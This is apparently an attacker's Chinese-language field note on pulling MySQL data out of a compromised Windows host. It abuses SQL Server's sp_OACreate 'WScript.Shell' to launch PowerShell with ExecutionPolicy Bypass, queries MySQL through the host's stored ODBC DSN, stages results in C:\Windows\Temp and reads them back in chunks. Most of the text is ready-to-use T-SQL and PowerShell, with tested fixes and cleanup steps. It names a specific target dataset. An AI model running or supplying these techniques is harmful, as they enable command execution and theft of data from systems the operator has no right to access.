# 背景
目标 Windows 宿主上有 SQL Server（可 sa/管理员登录）且已装 MySQL ODBC 驱动、存有指向 MySQL 的 DSN/连接串。只想要 MySQL 数据，不想（或不能）从本机直连。做法：T-SQL 里 sp_OACreate 'WScript.Shell' 起 PowerShell 跑查询脚本，结果落盘再经 sp_OACreate 'Scripting.FileSystemObject' 分块读回。

# 关键坑（实测）
1. sp_OACreate 'ADODB.Connection' + Recordset.GetString 对 **CONCAT/聚合/派生列** 返回空串（MySQL ODBC 5.3 把这类列标成二进制 charset），CursorType=0/1 均无效。→ 用 PowerShell 的 [System.Data.Odbc.OdbcConnection]，逐字段 GetValue。
2. FSO CreateTextFile 不会自建父目录，父目录不存在时 create_hr != 0、后续 Write 全失败。→ 每条命令前先 `cmd.exe /c mkdir C:\Windows\Temp\<dir> 2>nul`，结束 `rmdir /s /q`。
3. 结果回读要分块：把文件按 3800 字节读进 `#c(idx IDENTITY, txt NVARCHAR(4000))` 再 `SELECT idx,txt`，避免单条 TDS 响应过大；等待完成用 FSO FileExists + `WAITFOR DELAY '00:00:02'` 轮询（36 次≈72s 足够 50~100 条查询）。

# 落盘脚本骨架（q.ps1）
```powershell
$cs='Driver={MySQL ODBC 5.3 ANSI Driver};Server=<host>;Port=3306;User=<u>;Password=<p>;Database=<db>;Option=3;'
$cn=New-Object System.Data.Odbc.OdbcConnection $cs; $cn.Open()
function San($v){ if($v -is [System.DBNull]){return '\N'}; if($null -eq $v){return '\N'};
  return ([string]$v).Replace("`r",' ').Replace("`n",' ').Replace("`t",' ') }
$out=New-Object System.Text.StringBuilder
foreach($ln in [IO.File]::ReadAllLines('<qfile>')){          # 每行 label<TAB>SQL
  $ix=$ln.IndexOf([char]9); $lab=$ln.Substring(0,$ix); $sql=$ln.Substring($ix+1)
  $cmd=$cn.CreateCommand(); $cmd.CommandText=$sql; $rd=$cmd.ExecuteReader()
  $n=0
  while($rd.Read()){ $vals=@(); for($i=0;$i -lt $rd.FieldCount;$i++){ $vals+=(San $rd.GetValue($i)) }
    [void]$out.AppendLine($lab+"`t"+($vals -join '|')); $n++; if($n -ge 130){break} }
  $rd.Close(); [void]$out.AppendLine($lab+"`t__ROWS__`t$n")
}
$cn.Close(); [IO.File]::WriteAllText('<resfile>',$out.ToString()); [IO.File]::WriteAllText('<done>','1')
```
# T-SQL 侧
```sql
-- 预建目录
EXEC sp_OACreate 'WScript.Shell',@sh OUTPUT;
EXEC sp_OAMethod @sh,'Exec',@ex OUTPUT,'cmd.exe /c mkdir C:\Windows\Temp\job 2>nul';
-- 写 q.ps1 / queries.txt（CreateTextFile + 多次 sp_OAMethod @f,'Write',NULL,'...'，单引号翻倍）
-- 起跑
EXEC sp_OAMethod @sh,'Exec',@ex OUTPUT,'cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\job\q.ps1';
-- 轮询 + 分块回读（FileExists → CreateTextFile 读取 → #c 临时表）
```
# 取值解码
TDS 回显里字符串若形如 `"195 139 32 ..."`（空格分隔十进制字节），是二进制列被 tostring 化，按 `bytes(int(x) for x in s.split()).decode()` 还原再判空/判前缀（本次 Exchequer tlStockCode 首字节 0x10 为长度前缀，前缀要取 SUBSTRING(...,2,3) 而不是 LIKE 'DLS%'）。